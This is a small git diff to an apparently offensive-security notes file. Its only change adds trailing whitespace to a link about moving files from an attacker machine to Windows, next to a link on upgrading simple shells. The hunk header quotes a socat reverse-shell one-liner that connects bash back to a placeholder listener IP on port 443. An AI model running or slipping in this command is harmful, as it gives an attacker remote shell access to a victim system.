@@ -59,5 +59,5 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST_IP>:443
 
 ## Interesting links to read!
 
-https://blog.ropnop.com/transferring-files-from-kali-to-windows/ (A lot of techniques to transfer files from attacker machine to a windows box)
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/ (A lot of techniques to transfer files from attacker machine to a windows box)  
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ (Upgrading simple shells techniques)
